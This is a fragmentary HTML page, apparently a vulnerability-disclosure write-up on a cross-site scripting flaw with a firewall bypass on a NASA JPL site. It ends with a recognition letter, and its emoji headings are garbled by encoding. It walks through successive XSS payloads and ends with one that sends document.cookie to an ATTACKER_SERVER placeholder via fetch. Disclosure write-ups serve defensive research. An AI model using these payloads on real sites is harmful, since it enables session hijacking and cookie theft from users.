...
<article>
  ...
  <div class="lang-switcher">
    <a href="../../../es/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn">EspaÃƒÂ±ol (ES)</a>
...
<pre><code>console.log('pwn');</code></pre>
    ...
    <h2>Ã°Å¸â€ºÂ¡Ã¯Â¸Â Tag &lt;script&gt; Disallowed</h2>
...
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    ...
    <h2>Ã°Å¸Ââ€”Ã¯Â¸Â Close Javascript console.log String</h2>
    ...
    <h2>Ã¢Ââ€œ Append Javascript (Not Working)</h2>
    ...
    <h2>Ã¢Å“â€¦ Append Javascript (Working)</h2>
...
pwn')%3balert(1)</code></pre>
    ...
    <h2>Ã°Å¸Å¡Â¨ First Alert (Working)</h2>
...
<pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    ...
    <h2>Ã°Å¸â€ºâ€˜ Second Alert (Firewall Blocks)</h2>
...
<pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    ...
    <h2>Ã°Å¸â€â€œ Third Alert (Firewall Bypass)</h2>
...
&lt;/script&gt;;//  // Close the &lt;script&gt; and comment the rest of the code</code></pre>
    ...
    <h2>Ã°Å¸Å¡â‚¬ Final Exploit (Cookies Exfiltration)</h2>
...
<pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    ...
    <h2>Ã°Å¸Å½â€“Ã¯Â¸Â Recognition & Award</h2>
    ...
    <p style="text-align: center; margin-top: 20px;">
      <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">Ã°Å¸â€œÂ¥ Download Official Letter (PDF)</a>
    </p>
